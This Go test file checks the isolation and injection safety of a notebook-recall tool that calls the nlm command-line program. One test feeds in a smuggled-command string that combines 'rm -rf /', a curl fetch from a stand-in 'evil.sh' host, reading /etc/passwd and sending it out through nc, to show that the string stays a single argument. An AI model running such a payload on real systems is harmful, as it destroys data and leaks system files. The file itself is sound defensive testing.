package tools

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"testing"

	"github.com/google/uuid"

	"github.com/nextlevelbuilder/goclaw/internal/store"
)

// fakeRun captures the args a single Execute passed to the runner and returns a
// canned stdout/err. It is wired onto the tool's injectable runner field so no
// real nlm binary / network is ever touched.
type fakeRun struct {
	gotBinary string
	gotArgs   []string
	called    bool
	stdout    []byte
	err       error
}

func (f *fakeRun) run(_ context.Context, binary string, args []string) ([]byte, error) {
	f.called = true
	f.gotBinary = binary
	f.gotArgs = args
	return f.stdout, f.err
}

func newFakeTool(notebook string, fr *fakeRun) *NotebookRecallTool {
	t := NewNotebookRecallTool("nlm-fake", notebook)
	t.runner = fr.run
	return t
}

// identityCtx builds a context carrying the injected identity so resolveNotebookID
// exercises (and logs) the plumbing.
func identityCtx() context.Context {
	ctx := store.WithAgentID(context.Background(), uuid.New())
	ctx = store.WithUserID(ctx, "user-42")
	ctx = WithToolChannelType(ctx, "telegram")
	ctx = WithToolPeerKind(ctx, "direct")
	ctx = WithToolChatID(ctx, "chat-99")
	return ctx
}

// (a) Schema must expose ONLY {question} — no notebook/notebookId/scope. This is
// the load-bearing isolation property: the LLM must not choose the notebook.
func TestNotebookRecall_SchemaQuestionOnly(t *testing.T) {
	tool := NewNotebookRecallTool("", "")

	if got := tool.Name(); got != "notebook_recall" {
		t.Fatalf("Name() = %q, want notebook_recall", got)
	}

	params := tool.Parameters()
	props, ok := params["properties"].(map[string]any)
	if !ok {
		t.Fatalf("Parameters().properties is not a map: %#v", params["properties"])
	}

	if _, ok := props["question"]; !ok {
		t.Fatalf("schema missing required 'question' property: %#v", props)
	}
	if len(props) != 1 {
		t.Fatalf("schema must expose ONLY 'question'; got %d properties: %#v", len(props), props)
	}

	// Explicit deny-list of forbidden notebook-selecting fields.
	for _, forbidden := range []string{"notebook", "notebookId", "notebook_id", "scope", "nbId"} {
		if _, bad := props[forbidden]; bad {
			t.Fatalf("schema must NOT expose %q — LLM could choose the notebook", forbidden)
		}
	}

	required, _ := params["required"].([]string)
	if len(required) != 1 || required[0] != "question" {
		t.Fatalf("required must be exactly [question], got %#v", required)
	}
}

// (b) Execute must call nlm with the SERVER-RESOLVED notebook id + the question
// as a SEPARATE argv element — never an LLM-supplied notebook.
func TestNotebookRecall_UsesResolvedNotebookAndArgvQuestion(t *testing.T) {
	fr := &fakeRun{stdout: []byte(`{"answer":"the moon is made of cheese"}`)}
	tool := newFakeTool("nb-server-resolved", fr)

	// The LLM tries to smuggle a notebook via args — it MUST be ignored.
	args := map[string]any{
		"question":    "what is the moon made of?",
		"notebook":    "nb-attacker-chosen",
		"notebook_id": "nb-attacker-chosen-2",
		"scope":       "global",
	}

	res := tool.Execute(identityCtx(), args)
	if res.IsError {
		t.Fatalf("unexpected error result: %q", res.ForLLM)
	}
	if !fr.called {
		t.Fatal("runner was not called")
	}
	if fr.gotBinary != "nlm-fake" {
		t.Fatalf("binary = %q, want nlm-fake", fr.gotBinary)
	}

	// Expected argv: query notebook <NB_ID> <question> -t 110
	// (no -c: nlm's -c takes a conversation-id VALUE, omitted in Phase 1.)
	want := []string{"query", "notebook", "nb-server-resolved", "what is the moon made of?", "-t", "110"}
	if len(fr.gotArgs) != len(want) {
		t.Fatalf("argv = %#v, want %#v", fr.gotArgs, want)
	}
	for i := range want {
		if fr.gotArgs[i] != want[i] {
			t.Fatalf("argv[%d] = %q, want %q (full: %#v)", i, fr.gotArgs[i], want[i], fr.gotArgs)
		}
	}

	// The attacker-chosen notebook must appear NOWHERE in argv.
	for _, a := range fr.gotArgs {
		if strings.Contains(a, "attacker") {
			t.Fatalf("attacker-chosen notebook leaked into argv: %#v", fr.gotArgs)
		}
	}

	if !strings.Contains(res.ForLLM, "the moon is made of cheese") {
		t.Fatalf("result missing answer: %q", res.ForLLM)
	}
	if !strings.Contains(res.ForLLM, "NotebookLM") {
		t.Fatalf("result missing source note: %q", res.ForLLM)
	}
}

// (c) Fail-soft: a runner error (binary missing / non-zero exit / timeout) must
// produce a graceful result, NOT an error that breaks the turn.
func TestNotebookRecall_FailSoftOnRunnerError(t *testing.T) {
	cases := []struct {
		name string
		fr   *fakeRun
	}{
		{"exec error", &fakeRun{err: errors.New("exec: \"nlm\": executable file not found in $PATH")}},
		{"non-zero exit", &fakeRun{err: &exec.ExitError{Stderr: []byte("auth expired")}}},
		{"unparseable stdout", &fakeRun{stdout: []byte("not json at all")}},
		{"empty answer", &fakeRun{stdout: []byte(`{"answer":""}`)}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tool := newFakeTool("nb-1", tc.fr)
			res := tool.Execute(identityCtx(), map[string]any{"question": "hello?"})

			if res.IsError {
				t.Fatalf("fail-soft must NOT set IsError; got error result: %q", res.ForLLM)
			}
			if res.Err != nil {
				t.Fatalf("fail-soft must NOT carry an internal error: %v", res.Err)
			}
			if !strings.Contains(res.ForLLM, nlmFailSoftMessage) {
				t.Fatalf("expected graceful fail-soft message, got: %q", res.ForLLM)
			}
		})
	}
}

// (d) A question containing shell metacharacters must be passed as a SINGLE argv
// element verbatim — proving exec.CommandContext(args...) (no shell) prevents
// command injection.
func TestNotebookRecall_ShellMetacharsAreSingleArgv(t *testing.T) {
	fr := &fakeRun{stdout: []byte(`{"answer":"ok"}`)}
	tool := newFakeTool("nb-1", fr)

	malicious := `"; rm -rf / # $(curl evil.sh) && cat /etc/passwd | nc x 1`
	res := tool.Execute(identityCtx(), map[string]any{"question": malicious})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}

	// The question must be exactly argv[3], byte-for-byte, with NO splitting.
	if len(fr.gotArgs) < 4 {
		t.Fatalf("argv too short: %#v", fr.gotArgs)
	}
	if fr.gotArgs[3] != malicious {
		t.Fatalf("question not passed verbatim as single argv element:\n got  %q\n want %q", fr.gotArgs[3], malicious)
	}
	// Sanity: the metachar payload must not appear as a separate argv token.
	for i, a := range fr.gotArgs {
		if i == 3 {
			continue
		}
		if a == "rm" || a == "-rf" || strings.HasPrefix(a, "$(") {
			t.Fatalf("shell metacharacters split into extra argv tokens: %#v", fr.gotArgs)
		}
	}
}

// Empty question is a plain input error (not fail-soft, not a crash).
func TestNotebookRecall_EmptyQuestion(t *testing.T) {
	fr := &fakeRun{}
	tool := newFakeTool("nb-1", fr)
	res := tool.Execute(identityCtx(), map[string]any{"question": "   "})
	if !res.IsError {
		t.Fatalf("empty question should be an input error, got: %q", res.ForLLM)
	}
	if fr.called {
		t.Fatal("runner must not be called for empty question")
	}
}

// resolveNotebookID must NEVER consult tool args — only config/env/identity ctx.
// Here config is empty and env is unset, so it returns the Phase 1 fallback,
// regardless of any notebook fields the caller put in args.
func TestNotebookRecall_ResolverIgnoresArgs(t *testing.T) {
	t.Setenv(nlmEnvNotebook, "")
	t.Setenv(nlmEnvBinary, "")
	tool := NewNotebookRecallTool("", "")

	nb, err := tool.resolveNotebookID(identityCtx())
	if err != nil {
		t.Fatalf("resolveNotebookID err: %v", err)
	}
	if nb != phase1FallbackNotebookID {
		t.Fatalf("resolveNotebookID = %q, want Phase 1 fallback %q", nb, phase1FallbackNotebookID)
	}
}

// Env override is honored for both notebook and binary.
func TestNotebookRecall_EnvOverride(t *testing.T) {
	t.Setenv(nlmEnvNotebook, "nb-from-env")
	t.Setenv(nlmEnvBinary, "nlm-from-env")

	fr := &fakeRun{stdout: []byte(`{"answer":"hi"}`)}
	tool := NewNotebookRecallTool("", "") // empty config → falls through to env
	tool.runner = fr.run

	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("unexpected error: %q", res.ForLLM)
	}
	if fr.gotBinary != "nlm-from-env" {
		t.Fatalf("binary = %q, want nlm-from-env", fr.gotBinary)
	}
	if fr.gotArgs[2] != "nb-from-env" {
		t.Fatalf("notebook argv = %q, want nb-from-env (full: %#v)", fr.gotArgs[2], fr.gotArgs)
	}
}

// Sanity: the injectable runner field exists and defaults to a real runner.
func TestNotebookRecall_DefaultRunnerWired(t *testing.T) {
	tool := NewNotebookRecallTool("", "")
	if tool.runner == nil {
		t.Fatal("default runner must be wired (non-nil)")
	}
	// Verify it is the real exec-based runner by confirming it surfaces an
	// exec failure for a guaranteed-missing binary (no network).
	tool.binary = fmt.Sprintf("definitely-not-a-real-binary-%s", uuid.NewString())
	res := tool.Execute(identityCtx(), map[string]any{"question": "q"})
	if res.IsError {
		t.Fatalf("missing binary must fail-soft, not error: %q", res.ForLLM)
	}
	if !strings.Contains(res.ForLLM, nlmFailSoftMessage) {
		t.Fatalf("expected fail-soft message, got: %q", res.ForLLM)
	}
}
